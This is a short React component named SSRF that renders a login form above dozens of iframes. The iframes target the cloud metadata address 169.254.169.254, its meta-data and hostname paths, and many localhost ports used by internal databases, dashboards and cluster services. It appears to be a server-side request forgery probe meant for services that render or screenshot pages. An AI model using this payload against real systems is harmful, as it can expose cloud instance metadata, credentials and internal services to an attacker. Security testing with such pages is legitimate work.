import Login from './LoginForm'

function SSRF() {
  return (
    <>
    <Login />
    <div className=''>
        {/* <iframe src='https://www.youtube.com/embed/dQw4w9WgXcQ' /> */}
        <iframe className='w-lg h-24' src='http://169.254.169.254' />
        <iframe  className='w-2xl bg-red-100 h-96' src='https://salesblink-delta.vercel.app/' />
        <iframe  className='w-2xl bg-red-100 h-96' src='http://169.254.169.254/latest/meta-data/' />
        <iframe  className='w-2xl bg-red-100 h-96' src='http://169.254.169.254/latest/meta-data/hostname' />
        <iframe  className='w-2xl bg-red-100 h-96' src='http://127.0.0.1:8080/' />
        <iframe  className='w-2xl bg-red-100 h-96' src='https://jsonplaceholder.typicode.com/todos/1' /> 
         <iframe className="w-2xl bg-red-100 bg-red-100 h-96" src="http://127.0.0.1:8091"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:8333"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:8443"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:8880"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:8888"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:9000"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:9001"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:9043"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:9090"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:9091"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:9100"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:9200"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:9443"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:9800"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:12443"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:16080"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:18091"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:18092"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:20720"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:28017"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:45001"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:4433"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:6443"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:8009"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:8082"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:9040"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:9300"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:9990"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:27017"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:5984"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:5601"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:4000"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:8089"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:8800"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:9443"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:9080"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:7001"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:7002"></iframe>
  <iframe className="w-2xl bg-red-100 h-96" src="http://127.0.0.1:8010"></iframe>
    </div>
    </>
  )
}

export default SSRF